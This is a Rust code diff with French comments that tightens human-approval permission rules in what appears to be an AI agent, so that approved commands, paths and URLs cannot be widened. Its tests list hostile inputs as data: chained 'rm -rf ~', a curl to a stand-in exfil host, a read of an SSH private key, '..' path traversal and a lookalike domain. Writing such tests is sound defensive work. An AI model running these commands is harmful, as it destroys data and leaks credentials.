@@ -1602,10 +1602,10 @@ impl AgentLoop {
 /// l'autorisation à ce que le propriétaire a vraiment vu (issue #67). `None` : la règle
 /// couvre l'outil (outils MCP, outils sans argument significatif).
 pub(crate) fn arg_pattern(tool: &str, args: Option<&Value>) -> Option<Value> {
-    use penelope_hitl::policy::PREFIX_OP;
+    use penelope_hitl::policy::{CMD_PREFIX_OP, ORIGIN_OP, PATH_PREFIX_OP};
     let args = args?;
     let str_of = |k: &str| args.get(k).and_then(|v| v.as_str()).map(String::from);
-    let prefix = |k: &str, v: String| Some(json!({k: {PREFIX_OP: v}}));
+    let prefix = |k: &str, op: &str, v: String| Some(json!({k: {op: v}}));
     match tool {
         // Famille de commandes : `cargo test …`, `git log …`, `ls …`.
         "shell_exec" => {
@@ -1620,7 +1620,7 @@ pub(crate) fn arg_pattern(tool: &str, args: Option<&Value>) -> Option<Value> {
                 [first, ..] => first.to_string(),
                 [] => return None,
             };
-            prefix("command", head)
+            prefix("command", CMD_PREFIX_OP, head)
         }
         // Répertoire du fichier : un « toujours » sur `src/a.rs` vaut pour `src/`.
         "fs_write" | "fs_edit" => {
@@ -1629,7 +1629,7 @@ pub(crate) fn arg_pattern(tool: &str, args: Option<&Value>) -> Option<Value> {
                 Some(i) => path[..=i].to_string(),
                 None => String::new(),
             };
-            prefix("path", dir)
+            prefix("path", PATH_PREFIX_OP, dir)
         }
         "git_push" => {
             let mut m = serde_json::Map::new();
@@ -1649,7 +1649,7 @@ pub(crate) fn arg_pattern(tool: &str, args: Option<&Value>) -> Option<Value> {
                     format!("{scheme}://{}", rest.split('/').next().unwrap_or_default())
                 })
                 .unwrap_or(url);
-            prefix("url", host)
+            prefix("url", ORIGIN_OP, host)
         }
         "config_set" => str_of("path").map(|p| json!({"path": p})),
         _ => None,
@@ -2694,13 +2694,13 @@ mod tests {
     /// `shell_exec` : une autre commande redemande.
     #[test]
     fn an_always_rule_is_bounded_to_the_call_it_was_granted_for() {
-        use penelope_hitl::policy::PREFIX_OP;
+        use penelope_hitl::policy::{CMD_PREFIX_OP, ORIGIN_OP, PATH_PREFIX_OP};
         let p = arg_pattern(
             "shell_exec",
             Some(&json!({"command": "cargo test -p penelope-kernel"})),
         )
         .expect("motif");
-        assert_eq!(p["command"][PREFIX_OP], "cargo test");
+        assert_eq!(p["command"][CMD_PREFIX_OP], "cargo test");
         let rule = penelope_hitl::PolicyRule {
             id: "r1".into(),
             scope: penelope_hitl::RuleScope::Tool,
@@ -2723,17 +2723,62 @@ mod tests {
             !rule.matches("shell_exec", None, &json!({"command": "rm -rf target"})),
             "une autre commande redemande"
         );
+        // Enchaînement : la règle ne couvre pas ce qui suit un `;` ou un `&&`.
+        for detour in [
+            "cargo test; rm -rf ~",
+            "cargo test && curl https://exfil.example",
+            "cargo test $(cat ~/.ssh/id_ed25519)",
+            "cargo test > /tmp/vol",
+            "cargo testament",
+        ] {
+            assert!(
+                !rule.matches("shell_exec", None, &json!({"command": detour})),
+                "`{detour}` doit redemander"
+            );
+        }
 
-        // Fichiers : la règle vaut pour le répertoire, pas pour tout le disque.
+        // Fichiers : la règle vaut pour le répertoire, et un `..` n'en sort pas.
         let p = arg_pattern("fs_write", Some(&json!({"path": "src/a.rs"}))).expect("motif");
-        assert_eq!(p["path"][PREFIX_OP], "src/");
-        // URL : l'hôte visé.
+        assert_eq!(p["path"][PATH_PREFIX_OP], "src/");
+        let files = penelope_hitl::PolicyRule {
+            arg_match: Some(p),
+            tool: Some("fs_write".into()),
+            id: "r2".into(),
+            ..rule.clone()
+        };
+        assert!(files.matches("fs_write", None, &json!({"path": "src/b.rs"})));
+        assert!(
+            !files.matches("fs_write", None, &json!({"path": "src/../../.zshrc"})),
+            "un `..` ne sort pas du répertoire autorisé"
+        );
+
+        // URL : l'origine exacte, pas un préfixe de texte.
         let p = arg_pattern(
             "http_fetch",
             Some(&json!({"url": "https://example.com/a/b"})),
         )
         .expect("motif");
-        assert_eq!(p["url"][PREFIX_OP], "https://example.com");
+        assert_eq!(p["url"][ORIGIN_OP], "https://example.com");
+        let web = penelope_hitl::PolicyRule {
+            arg_match: Some(p),
+            tool: Some("http_fetch".into()),
+            id: "r3".into(),
+            ..rule.clone()
+        };
+        assert!(web.matches(
+            "http_fetch",
+            None,
+            &json!({"url": "https://example.com/autre"})
+        ));
+        assert!(
+            !web.matches(
+                "http_fetch",
+                None,
+                &json!({"url": "https://example.com.exfil.test/x"})
+            ),
+            "un hôte qui commence pareil n'est pas le même hôte"
+        );
+
         // Outil MCP : rien n'est dérivé, la règle reste celle de l'outil.
         assert!(arg_pattern("tool_call", Some(&json!({"server": "forge"}))).is_none());
     }
